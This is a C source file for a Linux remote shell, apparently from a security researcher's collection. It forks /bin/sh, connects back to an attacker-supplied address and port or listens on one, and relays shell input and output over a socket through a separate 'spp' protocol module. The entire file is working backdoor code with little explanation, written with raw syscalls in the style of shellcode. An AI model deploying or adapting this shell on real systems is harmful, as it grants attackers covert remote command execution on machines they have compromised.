/**
  Copyright © 2017 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */

#include <unistd.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <net/if.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sys/epoll.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#include "spp.h"

#define HTONS(x) ((((uint16_t)(x) & 0xff00) >> 8) | (((uint16_t)(x) & 0x00ff) << 8))

typedef struct sc_properties_t {
  union {
    int pipes[4];
    struct {
      int in[2], out[2];
    };
  };
  pid_t       pid;
  int         efd;
  struct      epoll_event evts[1];
  spp_ctx     c;  
  spp_buf     x; 
} p_tbl;

void main(int argc, char *argv[])
{
    struct sockaddr_in sa;
    int                i, r, evt, fd, h[2];
    p_tbl              p;
    
    memset(&p, 0, sizeof(p));

    // create pipes for redirection of stdin/stdout/stderr
    syscall(SYS_pipe,  p.in);
    syscall(SYS_pipe, p.out);

    // execute /bin/sh as child process
    p.pid = syscall(SYS_fork);
    
    if (p.pid==0) 
    {
      // assign read end to stdin
      syscall(SYS_dup2,  p.in[0], STDIN_FILENO );
      // assign write end to stdout   
      syscall(SYS_dup2, p.out[1], STDOUT_FILENO);
      // assign write end to stderr  
      syscall(SYS_dup2, p.out[1], STDERR_FILENO);  
      
      syscall(SYS_close, p.in[0]);
      syscall(SYS_close, p.in[1]);
      
      syscall(SYS_close, p.out[0]);
      syscall(SYS_close, p.out[1]);
      
      syscall(SYS_execve, "/bin/sh", NULL, NULL);
    } else {      
      syscall(SYS_close,  p.in[0]); // close read end
      syscall(SYS_close, p.out[1]); // close write end
      
      // create a socket
      p.c.s = syscall(SYS_socket, AF_INET, SOCK_STREAM, IPPROTO_IP);
      
      sa.sin_family      = AF_INET;
      sa.sin_port        = HTONS(atoi(argv[2]));
      sa.sin_addr.s_addr = inet_addr(argv[1]);

      #ifdef CONNECT
        // attempt connection to remote host
        syscall(SYS_connect, p.c.s, (struct sockaddr*)&sa, sizeof(sa));
      #else
        syscall(SYS_bind, p.c.s, (struct sockaddr*)&sa, sizeof(sa));
        syscall(SYS_listen, p.c.s, 0);
        r = syscall(SYS_accept, p.c.s, 0, 0);
      #endif
      
      if ((p.efd = syscall(SYS_epoll_create1, 0)) > 0)
      {
        h[0] = p.c.s;    // assign socket to peer
        h[1] = p.out[0]; // assign read end for stdout/stderr
        
        // add 2 descriptors to monitor
        // level triggered
        for (i=0; i<2; i++)
        {
          p.evts[0].data.fd = h[i];
          p.evts[0].events  = EPOLLIN;
          
          syscall(SYS_epoll_ctl, p.efd, 
              EPOLL_CTL_ADD, h[i], &p.evts[0]);
        }
          
        // now loop until user exits or some other error
        for (;;)
        {
          r = syscall(SYS_epoll_wait, p.efd, 
              p.evts, 1, -1);
                    
          if (r <= 0) {
            break;
          }
           
          evt = p.evts[0].events;
          fd  = p.evts[0].data.fd;
          
          if (!(evt & EPOLLIN)) break;

          if (fd == p.c.s)
          {
            // receive incoming data
            if (spp_recv(&p.c, &p.x) != SPP_ERR_OK) {
              break;
            }                              
            // write to stdin of child process
            syscall(SYS_write, p.in[1], 
                p.x.data.b, p.x.len.w);
          } else {
            // read from stdout/stderr
            p.x.len.w = syscall(SYS_read, p.out[0], 
                p.x.data.b, SPP_BLK_LEN);
                
            // send to remote peer
            if (spp_send(&p.c, &p.x) != SPP_ERR_OK) {
              break;
            }
          }         
        }
        // remove 2 descriptors 
        for (i=0; i<2; i++) {
          syscall(SYS_epoll_ctl, p.efd, 
              EPOLL_CTL_DEL, h[i], NULL);
        }            
        syscall(SYS_close, p.efd);
      }
      syscall(SYS_kill, p.pid, SIGCHLD);
      syscall(SYS_shutdown, p.c.s, SHUT_RDWR);      
      syscall(SYS_close, p.c.s);
    }
    syscall(SYS_close,  p.in[1]);
    syscall(SYS_close, p.out[0]);
    syscall(SYS_exit, 0);    
}
    
